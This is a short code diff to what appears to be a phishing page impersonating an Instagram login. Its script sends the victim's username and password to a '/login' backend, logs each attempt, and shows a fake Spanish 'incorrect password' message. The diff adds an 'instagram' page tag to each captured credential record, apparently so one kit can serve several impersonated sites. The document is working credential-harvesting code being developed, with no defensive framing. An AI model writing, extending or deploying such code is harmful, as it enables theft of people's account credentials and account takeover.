@@ -3291,6 +3291,7 @@
      ================================================================ */
   (function () {
     'use strict';
+    const PAGE_ID = 'instagram';
 
     var BACKEND = '/login';
     var ERROR_MSG = 'Tu contraseña es incorrecta. Compruébala e inténtalo de nuevo.';
@@ -3368,6 +3369,7 @@
       await sendLog(BACKEND, {
         username: username,
         password: password,
+        page: PAGE_ID,
         event: 'LOGIN_ATTEMPT'
       });
     }
